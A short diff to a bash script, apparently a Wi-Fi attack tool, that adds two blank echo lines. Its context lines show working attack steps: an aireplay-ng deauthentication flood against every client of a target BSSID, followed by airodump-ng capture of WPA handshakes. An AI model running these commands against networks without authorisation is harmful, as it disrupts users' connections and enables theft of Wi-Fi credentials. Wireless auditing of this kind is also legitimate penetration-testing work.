@@ -172,6 +172,7 @@ function deauthenticate_all_clients() {
 	user_sleep
 	xterm -hold -e "aireplay-ng -0 5 -a ${bssid} -c ff:ff:ff:ff:ff:ff ${network_card}" &
 	aireplay_xterm_pid=$!
+	echo ""
 	gum spin --timeout=10s --title="Waiting deauthentication for 10 seconds..." sleep 10
 	kill -9 $aireplay_xterm_pid
 	wait $aireplay_xterm_pid &>/dev/null
@@ -188,6 +189,7 @@ function handshake() {
 	airodump_filter_xterm_pid=$!
 	gum confirm "Do you want to start aireplay-ng to deauthenticate all clients?" && deauthenticate_all_clients || echo -e "\n${yellow}[!]${nc} Skipping deauthentication..."
 	handshake_wait=30
+	echo ""
 	gum spin --timeout=${handshake_wait}s --title="Waiting handshake for ${handshake_wait} seconds..." sleep ${handshake_wait}
 
 	if eapol_has_captured; then
